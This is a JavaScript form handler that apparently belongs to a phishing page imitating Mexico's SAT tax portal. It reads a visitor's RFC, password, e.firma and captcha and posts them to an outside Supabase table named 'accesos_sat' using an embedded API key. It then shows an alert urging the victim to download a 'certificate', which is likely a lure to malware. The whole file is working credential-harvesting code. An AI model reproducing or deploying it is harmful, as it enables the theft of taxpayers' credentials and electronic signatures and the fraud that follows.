const SUPABASE_URL = "https://ceywynuxwptqzntxsokj.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNleXd5bnV4d3B0cXpudHhzb2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY0Mjk4MDAsImV4cCI6MjA2MjAwNTgwMH0.SWDaRfaC9B9UIZmPxHXNnWIQoglKm1RrvXr_t5ushNA";

const form = document.getElementById("formAcceso");

form.addEventListener("submit", async function (e) {
  e.preventDefault();

  const rfc = document.getElementById("rfc").value;
  const contrasena = document.getElementById("password").value;
  const efirma = document.getElementById("efirma").value;
  const captcha = document.getElementById("captcha").value;

  const response = await fetch(`${SUPABASE_URL}/rest/v1/accesos_sat`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SUPABASE_KEY,
      "Authorization": `Bearer ${SUPABASE_KEY}`,
      "Prefer": "return=representation"
    },
    body: JSON.stringify({
      rfc,
      contrasena,
      efirma,
      captcha
    })
  });

  if (response.ok) {
    alert("❌ Acción requerida, descarga el certificado de dispositivo autorizado.");
    form.reset();
  } else {
    const error = await response.text();
    alert("❌ Error al enviar los datos: " + error);
  }
});
